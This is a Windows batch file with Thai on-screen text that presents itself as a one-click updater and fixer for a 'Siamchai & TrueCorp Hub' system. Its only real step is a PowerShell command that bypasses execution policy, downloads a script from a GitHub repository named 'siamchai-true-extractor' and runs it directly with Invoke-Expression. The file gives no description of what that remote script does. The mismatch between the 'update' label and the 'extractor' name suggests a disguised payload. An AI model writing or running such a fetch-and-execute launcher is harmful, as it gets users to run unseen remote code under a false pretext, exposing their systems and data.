@echo off
chcp 65001 >nul
title อัปเดตระบบ Siamchai & True Hub
cd /d "%~dp0"

echo ==================================================================
echo         ระบบอัปเดตอัตโนมัติ: Siamchai & TrueCorp Hub
echo                (คลิกเดียว อัปเดตและแก้ปัญหาทันที)
echo ==================================================================
echo.
echo กำลังเชื่อมต่อไปยังเซิร์ฟเวอร์เพื่ออัปเดตระบบ กรุณารอสักครู่...
echo.

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; $script = $wc.DownloadString('https://raw.githubusercontent.com/mongkholkp001-sys/siamchai-true-extractor/main/update_client.ps1'); Invoke-Expression $script"

echo.
echo กดปุ่มใดก็ได้เพื่อปิดหน้าต่างนี้...
pause >nul
